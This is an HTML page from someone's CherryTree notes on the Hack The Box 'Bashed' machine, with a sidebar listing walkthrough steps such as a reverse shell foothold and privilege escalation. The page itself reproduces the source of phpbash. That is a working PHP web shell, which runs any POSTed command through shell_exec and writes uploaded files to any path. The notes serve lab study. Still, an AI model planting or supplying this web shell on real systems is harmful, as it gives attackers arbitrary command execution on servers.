<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>phpbash.php source code</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="styles.css" type="text/css" />
</head>
<body><div class="main"><div class="tree">
<p><a href="../HacktheBox--Linux_Boxes.html">Linux Boxes</a></p>
<p><a href="HacktheBox--Linux_Boxes--bashed.html">bashed</a></p>

<ol>
<li><a href="HacktheBox--Linux_Boxes--bashed--nmap.html">nmap</a></li>
<li><a href="HacktheBox--Linux_Boxes--bashed--phpbash_github.html">phpbash github</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--bashed--phpbash_github--phpbash.php_source_code.html">phpbash.php source code</a></li>
</ol>
<li><a href="HacktheBox--Linux_Boxes--bashed--http.html">http</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--bashed--http--gobuster.html">gobuster</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--bashed--http--gobuster--dev-phpbash.min.php.html">dev/phpbash.min.php</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--bashed--http--gobuster--dev-phpbash.min.php--foothold_calling_back_reverse_shell_with_php.rev.html">foothold calling back reverse shell with php.rev</a></li>
</ol>
</ol>
</ol>
<li><a href="HacktheBox--Linux_Boxes--bashed--priv_esc_to_scriptmanager.html">priv esc to scriptmanager</a></li>
<li><a href="HacktheBox--Linux_Boxes--bashed--priv_esc_to_root.html">priv esc to root</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--bashed--priv_esc_to_root--Linux_smart_enumeration.html">Linux smart enumeration</a></li>
<ol>
<li><a href="HacktheBox--Linux_Boxes--bashed--priv_esc_to_root--Linux_smart_enumeration--upload_lse.sh.html">upload lse.sh</a></li>
<li><a href="HacktheBox--Linux_Boxes--bashed--priv_esc_to_root--Linux_smart_enumeration--lse_report.html">lse report</a></li>
</ol>
<li><a href="HacktheBox--Linux_Boxes--bashed--priv_esc_to_root--test.py_cron_job.html">test.py cron job</a></li>
<li><a href="HacktheBox--Linux_Boxes--bashed--priv_esc_to_root--reverse_shell.html">reverse shell</a></li>
</ol>
<li><a href="HacktheBox--Linux_Boxes--bashed--user-root.html">user/root</a></li>
<li><a href="HacktheBox--Linux_Boxes--bashed--lessons_learned.html">lessons learned</a></li>
</ol></div>
<div class="page"><h1><b><u>phpbash.php source code</u></b></h1><div class="codebox">&lt;?php<br /><span style="color:#ff9d00;font-weight:700">/</span>*&nbsp;phpbash&nbsp;by&nbsp;Alexander&nbsp;Reid&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Arrexel<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;*<span style="color:#ff9d00;font-weight:700">/</span><br /><span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>ISSET<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$_POST</span>[<span style="color:#3ad900;font-weight:400">'cmd'</span>]<span style="color:#ff9d00;font-weight:700">))</span>&nbsp;<span style="color:#ff9d00;font-weight:700">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">$output</span>&nbsp;=&nbsp;preg_split<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">'/[\n]/'</span>,&nbsp;shell_exec<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$_POST</span>[<span style="color:#3ad900;font-weight:400">'cmd'</span>].<span style="color:#3ad900;font-weight:400">"&nbsp;2&gt;&amp;1"</span><span style="color:#ff9d00;font-weight:700">));</span><br />&nbsp;&nbsp;&nbsp;&nbsp;foreach&nbsp;<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$output</span>&nbsp;as&nbsp;<span style="color:#7f0044;font-weight:400">$line</span><span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;htmlentities<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$line</span>,&nbsp;ENT_QUOTES&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;ENT_HTML5,&nbsp;<span style="color:#3ad900;font-weight:400">'UTF-8'</span><span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&lt;br&gt;"</span><span style="color:#ff9d00;font-weight:700">;</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">}</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ffdd00;font-weight:400">die()</span><span style="color:#ff9d00;font-weight:700">;</span>&nbsp;<br /><span style="color:#ff9d00;font-weight:700">}</span>&nbsp;<span style="color:#ff9d00;font-weight:700">else</span>&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(!</span>empty<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$_FILES</span>[<span style="color:#3ad900;font-weight:400">'file'</span>][<span style="color:#3ad900;font-weight:400">'tmp_name'</span>]<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">&amp;&amp;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">!</span>empty<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$_POST</span>[<span style="color:#3ad900;font-weight:400">'path'</span>]<span style="color:#ff9d00;font-weight:700">))</span>&nbsp;<span style="color:#ff9d00;font-weight:700">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">$filename</span>&nbsp;=&nbsp;<span style="color:#7f0044;font-weight:400">$_FILES</span>[<span style="color:#3ad900;font-weight:400">"file"</span>][<span style="color:#3ad900;font-weight:400">"name"</span>]<span style="color:#ff9d00;font-weight:700">;</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">$path</span>&nbsp;=&nbsp;<span style="color:#7f0044;font-weight:400">$_POST</span>[<span style="color:#3ad900;font-weight:400">'path'</span>]<span style="color:#ff9d00;font-weight:700">;</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$path</span>&nbsp;<span style="color:#ff9d00;font-weight:700">!</span>=&nbsp;<span style="color:#3ad900;font-weight:400">"/"</span><span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">$path</span>&nbsp;.=&nbsp;<span style="color:#3ad900;font-weight:400">"/"</span><span style="color:#ff9d00;font-weight:700">;</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">}</span>&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>move_uploaded_file<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$_FILES</span>[<span style="color:#3ad900;font-weight:400">"file"</span>][<span style="color:#3ad900;font-weight:400">"tmp_name"</span>],&nbsp;<span style="color:#7f0044;font-weight:400">$path</span>.<span style="color:#7f0044;font-weight:400">$filename</span><span style="color:#ff9d00;font-weight:700">))</span>&nbsp;<span style="color:#ff9d00;font-weight:700">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;htmlentities<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$filename</span><span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;<span style="color:#3ad900;font-weight:400">"&nbsp;successfully&nbsp;uploaded&nbsp;to&nbsp;"</span>&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;htmlentities<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$path</span><span style="color:#ff9d00;font-weight:700">);</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">}</span>&nbsp;<span style="color:#ff9d00;font-weight:700">else</span>&nbsp;<span style="color:#ff9d00;font-weight:700">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">echo</span>&nbsp;<span style="color:#3ad900;font-weight:400">"Error&nbsp;uploading&nbsp;"</span>&nbsp;<span style="color:#ff9d00;font-weight:700">.</span>&nbsp;htmlentities<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#7f0044;font-weight:400">$filename</span><span style="color:#ff9d00;font-weight:700">);</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">}</span><br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ffdd00;font-weight:400">die()</span><span style="color:#ff9d00;font-weight:700">;</span><br /><span style="color:#ff9d00;font-weight:700">}</span><br />?&gt;</div></div></div>
</body></html>